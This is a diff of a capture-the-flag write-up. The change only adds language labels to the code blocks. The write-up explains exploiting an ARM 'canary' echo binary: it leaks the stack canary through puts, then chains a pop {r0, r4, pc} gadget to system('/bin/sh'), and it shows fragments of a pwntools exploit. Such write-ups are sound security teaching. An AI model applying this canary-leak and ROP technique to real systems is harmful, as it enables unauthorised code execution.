@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $    file canary
 canary: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=3599326b9bf146191588a1e13fb3db905951de07, not stripped
 $    pwn checksec canary
@@ -17,22 +17,22 @@ $    pwn checksec canary
 So we can see that we are dealing with a `32` bit arm binary, that has a Stack Canary and NX stack. Arm is a different architecture from what we have been working with mostly, so things will be a bit different. Since we are dealing with arm binary, we will need qemu to run it (or some other emulator). In addition to that, if we want to use gdb we will need to install multi-architecture support for gdb. Lastly we will also need to install a utility for parsing through it's assembly code (we will use it later):
 
 To emulate the binary:
-```
+```console
 $    sudo apt-get install qemu-user
 ```
 
 For gdb support:
-```
+```console
 $    sudo apt-get install gdb-multiarch
 ```
 
 For assembly code viewing:
-```
+```console
 $    sudo apt-get install binutils-arm-none-eabi
 ```
 
 Now let's take a look at the binary:
-```
+```console
 $    qemu-arm canary
 Welcome to hxp's Echo Service!
 > 15935728
@@ -47,7 +47,7 @@ So we can see that it scan in data, and prints it back. Let's figure out exactly
 
 When we take a look at the main function in Ghidra, we see this:
 
-```
+```c
 undefined4 main(void)
 
 {
@@ -89,7 +89,7 @@ We will leak the stack canary using the `puts(input + 1)` call. This is how it w
 
 So with that we will be able to overwrite the return address and get code execution. The only question is what will we execute with it. We can see that system is imported into the binary at `0x16d90`, so that is a good candidate:
 
-```
+```nasm
                              **************************************************************
                              *                          FUNCTION                          *
                              **************************************************************
@@ -102,7 +102,7 @@ So with that we will be able to overwrite the return address and get code execut
 ```
 
 We can also see it using objdump:
-```
+```console
 $    arm-none-eabi-objdump -D canary | grep libc_system
 00016d90 <__libc_system>:
    16d94:    0a000000     beq    16d9c <__libc_system+0xc>
@@ -110,7 +110,7 @@ $    arm-none-eabi-objdump -D canary | grep libc_system
 
 Next we just need to prep the argument for the `system` function. In Ghidra we can see that the string `/bin/sh` is at `0x71eb0`:
 
-```
+```nasm
                              s_/bin/sh_00071eb0                              XREF[1]:     do_system:00016d58(*)  
         00071eb0 2f 62 69        ds         "/bin/sh"
                  6e 2f 73
@@ -119,19 +119,19 @@ Next we just need to prep the argument for the `system` function. In Ghidra we c
 
 The next thing that we will need is a ROP gadget that will pop values into the `r0` and `pc` registers. The code will expect it's argument in `r0`, and it will expect `pc` to hold the address to be executed:
 
-```
+```console
 $    python ROPgadget.py --binary canary | grep pop | grep r0 | grep pc
 ```
 
 Looking through the list, we find this one which works (although we will need 4 bytes of filler data for `r4`):
 
-```
+```nasm
 0x00026b7c : pop {r0, r4, pc}
 ```
 
 There is just one last thing that we will need before we can write the exploit. We know that the offset between the start of our input and the stack canary is `40` bytes, but what is the offset between the stack canary and the return address? Looking at the stack layout of the `main` function, we see that the canary is stored at offset `-0x14`:
 
-```
+```nasm
                              **************************************************************
                              *                          FUNCTION                          *
                              **************************************************************
@@ -151,7 +151,7 @@ Since the canary is `4` bytes, that means that the end of the canary will put us
 
 So our exploit will contain the following:
 
-```
+```text
 *    40 bytes of filler data
 *    4 bytes stack canary
 *    12 bytes of filler data to return address
@@ -165,7 +165,7 @@ So our exploit will contain the following:
 
 Putting it all together we have the following exploit:
 
-```
+```python
 # This exploit is based off of: https://ctftime.org/writeup/12568
 
 from pwn import *
@@ -209,7 +209,7 @@ target.interactive()
 
 When we run it:
 
-```
+```console
 $    python exploit.py
 [+] Starting local process '/usr/bin/qemu-arm': pid 20280
 Welcome to hxp's Echo Service!
